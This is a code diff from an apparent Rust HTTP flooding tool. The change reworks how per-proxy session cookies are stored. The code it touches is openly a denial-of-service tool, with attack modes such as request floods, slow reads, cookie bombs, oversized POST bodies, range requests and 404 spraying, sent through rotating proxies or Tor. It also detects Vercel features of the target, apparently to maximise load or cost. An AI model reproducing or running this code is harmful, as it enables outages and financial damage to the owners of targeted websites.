@@ -1,4 +1,3 @@
-use std::collections::HashMap;
 use std::sync::Arc;
 use std::time::{Duration, Instant};
 use std::sync::atomic::{AtomicBool, AtomicUsize, AtomicU64, Ordering};
@@ -112,19 +111,15 @@ fn print_help() {
     println!("  {} https://target.com tor normal 50 60 2>&1", env!("CARGO_PKG_NAME"));
 }
 
-async fn add_session_cookie(mut builder: RequestBuilder, proxy_id: &str, sessions: &Arc<Mutex<HashMap<String, String>>>) -> RequestBuilder {
-    if let Some(cookie) = sessions.lock().await.get(proxy_id).cloned() {
-        if !cookie.is_empty() { builder = builder.header("Cookie", cookie); }
-    }
+fn add_session_cookie(mut builder: RequestBuilder, proxy_idx: usize, sessions: &[std::sync::Mutex<String>]) -> RequestBuilder {
+    let cookie = sessions[proxy_idx].lock().unwrap().clone();
+    if !cookie.is_empty() { builder = builder.header("Cookie", cookie); }
     builder
 }
 
-async fn add_session_and_extra_cookie(mut builder: RequestBuilder, proxy_id: &str, sessions: &Arc<Mutex<HashMap<String, String>>>, extra_cookie: &str) -> RequestBuilder {
-    let cookie = if let Some(stored) = sessions.lock().await.get(proxy_id).cloned() {
-        if stored.is_empty() { extra_cookie.to_string() } else { format!("{}; {}", stored, extra_cookie) }
-    } else {
-        extra_cookie.to_string()
-    };
+fn add_session_and_extra_cookie(mut builder: RequestBuilder, proxy_idx: usize, sessions: &[std::sync::Mutex<String>], extra_cookie: &str) -> RequestBuilder {
+    let stored = sessions[proxy_idx].lock().unwrap().clone();
+    let cookie = if stored.is_empty() { extra_cookie.to_string() } else { format!("{}; {}", stored, extra_cookie) };
     builder = builder.header("Cookie", cookie);
     builder
 }
@@ -140,9 +135,9 @@ fn extract_set_cookie(headers: &HeaderMap) -> Option<String> {
     if cookies.is_empty() { None } else { Some(cookies.join("; ")) }
 }
 
-async fn update_session_from_headers(proxy_id: &str, sessions: &Arc<Mutex<HashMap<String, String>>>, headers: &HeaderMap) {
+fn update_session_from_headers(proxy_idx: usize, sessions: &[std::sync::Mutex<String>], headers: &HeaderMap) {
     if let Some(cookie) = extract_set_cookie(headers) {
-        sessions.lock().await.insert(proxy_id.to_string(), cookie);
+        *sessions[proxy_idx].lock().unwrap() = cookie;
     }
 }
 
@@ -339,29 +334,29 @@ async fn tcp_check(addr: &str, timeout: u64) -> bool {
     tokio::time::timeout(Duration::from_secs(timeout), tokio::net::TcpStream::connect(a)).await.ok().and_then(|r| r.ok()).is_some()
 }
 
-async fn fetch_page(c: Client, url: String, delay: u64, _ua: usize, proxy_id: String, sessions: Arc<Mutex<HashMap<String, String>>>) -> Result<usize, reqwest::Error> {
+async fn fetch_page(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<usize, reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
-    let builder = add_session_cookie(browser_request(c.get(&url)), &proxy_id, &sessions).await;
+    let builder = add_session_cookie(browser_request(c.get(&url)), proxy_idx, &sessions);
     let resp = builder.send().await?;
-    update_session_from_headers(&proxy_id, &sessions, resp.headers()).await;
+    update_session_from_headers(proxy_idx, &sessions, resp.headers());
     Ok(resp.bytes().await?.len())
 }
 
-async fn fetch_range(c: Client, url: String, delay: u64, _ua: usize, proxy_id: String, sessions: Arc<Mutex<HashMap<String, String>>>) -> Result<usize, reqwest::Error> {
+async fn fetch_range(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<usize, reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
     let end = 100 + (rand::rng().random_range(0..9000));
     let builder = browser_request(c.get(&url)).header("Range", format!("bytes=0-{}", end))
         .header("Accept", "*/*").header("Cache-Control", "no-cache");
-    let resp = add_session_cookie(builder, &proxy_id, &sessions).await.send().await?;
-    update_session_from_headers(&proxy_id, &sessions, resp.headers()).await;
+    let resp = add_session_cookie(builder, proxy_idx, &sessions).send().await?;
+    update_session_from_headers(proxy_idx, &sessions, resp.headers());
     Ok(resp.bytes().await?.len())
 }
 
-async fn fetch_slow(c: Client, url: String, delay: u64, _ua: usize, proxy_id: String, sessions: Arc<Mutex<HashMap<String, String>>>) -> Result<usize, reqwest::Error> {
+async fn fetch_slow(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<usize, reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
     let builder = browser_request(c.get(&url)).header("Accept", "*/*").header("Cache-Control", "no-cache");
-    let resp = add_session_cookie(builder, &proxy_id, &sessions).await.send().await?;
-    update_session_from_headers(&proxy_id, &sessions, resp.headers()).await;
+    let resp = add_session_cookie(builder, proxy_idx, &sessions).send().await?;
+    update_session_from_headers(proxy_idx, &sessions, resp.headers());
     let mut total = 0usize;
     let mut stream = resp.bytes_stream();
     use tokio_stream::StreamExt;
@@ -372,25 +367,24 @@ async fn fetch_slow(c: Client, url: String, delay: u64, _ua: usize, proxy_id: St
     Ok(total)
 }
 
-async fn fetch_post(c: Client, url: String, delay: u64, _ua: usize, proxy_id: String, sessions: Arc<Mutex<HashMap<String, String>>>) -> Result<usize, reqwest::Error> {
+async fn fetch_post(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<usize, reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
     let body = "x".repeat(5000 + (rand::rng().random_range(0..15000)));
     let builder = browser_request(c.post(&url)).header("Content-Type", "application/x-www-form-urlencoded")
         .header("Cache-Control", "no-cache").body(body);
-    let resp = add_session_cookie(builder, &proxy_id, &sessions).await.send().await?;
-    update_session_from_headers(&proxy_id, &sessions, resp.headers()).await;
+    let resp = add_session_cookie(builder, proxy_idx, &sessions).send().await?;
+    update_session_from_headers(proxy_idx, &sessions, resp.headers());
     Ok(resp.bytes().await?.len())
 }
 
-async fn fetch_cookie(c: Client, url: String, delay: u64, _ua: usize, proxy_id: String, sessions: Arc<Mutex<HashMap<String, String>>>) -> Result<usize, reqwest::Error> {
+async fn fetch_cookie(c: Client, url: String, delay: u64, _ua: usize, proxy_idx: usize, sessions: Arc<Vec<std::sync::Mutex<String>>>) -> Result<usize, reqwest::Error> {
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
-    // Standard cookie bomb uses very large cookies (~8KB) to overload server header limits
     let bomb_payload = "x".repeat(8192);
     let cookie = format!("_ga={}; _gid={}; session={}; bomb={}",
         rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>(), bomb_payload);
     let builder = browser_request(c.get(&url)).header("Accept", "*/*").header("Cache-Control", "no-cache");
-    let resp = add_session_and_extra_cookie(builder, &proxy_id, &sessions, &cookie).await.send().await?;
-    update_session_from_headers(&proxy_id, &sessions, resp.headers()).await;
+    let resp = add_session_and_extra_cookie(builder, proxy_idx, &sessions, &cookie).send().await?;
+    update_session_from_headers(proxy_idx, &sessions, resp.headers());
     Ok(resp.bytes().await?.len())
 }
 
@@ -427,7 +421,7 @@ struct AppState {
     is_vercel: bool, vercel_plan: String,
     has_isr: bool, has_cache_bypass: bool, has_edge_config: bool, has_log_drains: bool, has_storage: bool,
     imgs: Vec<String>, apis: Vec<String>, statics: Vec<String>,
-    sessions: Arc<Mutex<HashMap<String, String>>>,
+    sessions: Arc<Vec<std::sync::Mutex<String>>>,
 }
 
 impl AppState {
@@ -444,7 +438,7 @@ impl AppState {
         has_middleware: false, is_vercel: false, vercel_plan: String::new(),
         has_isr: false, has_cache_bypass: false, has_edge_config: false, has_log_drains: false, has_storage: false,
         imgs: vec![], apis: vec![], statics: vec![],
-        sessions: Arc::new(Mutex::new(HashMap::new())),
+        sessions: Arc::new(Vec::new()),
     }}
 }
 
@@ -730,7 +724,6 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
             };
             if let Some((idx, client)) = next_client {
                 let stats_clone = stats.clone();
-                let proxy_id = format!("p{}", idx);
                 let assets = assets.clone();
                 let attack = attack;
                 let target = target_url.clone();
@@ -740,44 +733,44 @@ async fn run_load(state: Arc<Mutex<AppState>>, pool: Arc<std::sync::Mutex<ProxyP
                 let _ = tokio::spawn(async move {
                     let result = match attack {
                         AttackMode::Bandwidth | AttackMode::Normal => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
-                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, idx, sessions_clone.clone()).await }
+                            else { fetch_page(client, assets[idx1].clone(), delay, 0, idx, sessions_clone.clone()).await }
                         }
                         AttackMode::SlowRead => {
-                            fetch_slow(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await
+                            fetch_slow(client, target.clone(), delay, 0, idx, sessions_clone.clone()).await
                         }
                         AttackMode::ImageOpt => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
-                            else { fetch_range(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, idx, sessions_clone.clone()).await }
+                            else { fetch_range(client, assets[idx1].clone(), delay, 0, idx, sessions_clone.clone()).await }
                         }
                         AttackMode::LargePost => {
-                            fetch_post(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await
+                            fetch_post(client, target.clone(), delay, 0, idx, sessions_clone.clone()).await
                         }
                         AttackMode::AssetSpray => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
-                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, idx, sessions_clone.clone()).await }
+                            else { fetch_page(client, assets[idx1].clone(), delay, 0, idx, sessions_clone.clone()).await }
                         }
                         AttackMode::RangeReq => {
-                            if assets.is_empty() { fetch_range(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
-                            else { fetch_range(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
+                            if assets.is_empty() { fetch_range(client, target.clone(), delay, 0, idx, sessions_clone.clone()).await }
+                            else { fetch_range(client, assets[idx1].clone(), delay, 0, idx, sessions_clone.clone()).await }
                         }
                         AttackMode::CookieBomb => {
-                            fetch_cookie(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await
+                            fetch_cookie(client, target.clone(), delay, 0, idx, sessions_clone.clone()).await
                         }
                         AttackMode::SSR => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
-                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, idx, sessions_clone.clone()).await }
+                            else { fetch_page(client, assets[idx1].clone(), delay, 0, idx, sessions_clone.clone()).await }
                         }
                         AttackMode::Middleware => {
-                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
-                            else { fetch_page(client, assets[idx1].clone(), delay, 0, proxy_id.clone(), sessions_clone.clone()).await }
+                            if assets.is_empty() { fetch_page(client, target.clone(), delay, 0, idx, sessions_clone.clone()).await }
+                            else { fetch_page(client, assets[idx1].clone(), delay, 0, idx, sessions_clone.clone()).await }
                         }
                         AttackMode::RequestFlood => {
-                            fetch_page(client, target.clone(), 0, 0, proxy_id.clone(), sessions_clone.clone()).await
+                            fetch_page(client, target.clone(), 0, 0, idx, sessions_clone.clone()).await
                         }
                         AttackMode::NotFound => {
                             let path = format!("/nonexistent-{:08x}", rand::random::<u32>());
-                            fetch_page(client, format!("{}{}", target.trim_end_matches('/'), path), delay, 0, proxy_id.clone(), sessions_clone.clone()).await
+                            fetch_page(client, format!("{}{}", target.trim_end_matches('/'), path), delay, 0, idx, sessions_clone.clone()).await
                         }
                     };
                     match result {
@@ -1114,6 +1107,13 @@ async fn main() {
             }
             let pool = Arc::new(std::sync::Mutex::new(ProxyPool::new(&prox_list)));
             println!("[3/3] Running load for {}s...", duration_secs);
+            {
+                let mut s_vec = Vec::with_capacity(prox_list.len());
+                for _ in 0..prox_list.len() {
+                    s_vec.push(std::sync::Mutex::new(String::new()));
+                }
+                state.lock().await.sessions = Arc::new(s_vec);
+            }
             let stats = {
                 let st = state.lock().await;
                 st.stats.clone()
